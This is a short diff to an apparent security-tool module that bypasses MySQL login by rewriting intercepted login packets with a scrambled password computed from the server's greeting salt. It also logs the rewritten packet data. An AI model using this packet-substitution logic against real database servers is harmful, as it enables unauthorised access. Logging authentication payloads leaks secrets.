@@ -33,9 +33,9 @@ class Vulnerability(MySQLVulnerabilityAbstract):
         else:
             try:
                 login_packet = self.parse_login_request_packet(data)
-                new_password = self.scramble_caching_sha2(login_packet[8], self._greeting_packet[13])
+                new_password = self.scramble_caching_sha2(self.password, self._greeting_packet[13])
                 self._data = data.replace(login_packet[8], new_password)
-                self._logger.info("Login bypass successful")
+                self._logger.info("Login bypass successful", new_data=self._data)
                 return True
             except Exception as ex:
                 self._logger.debug("Unable to parse the packet", error=ex)
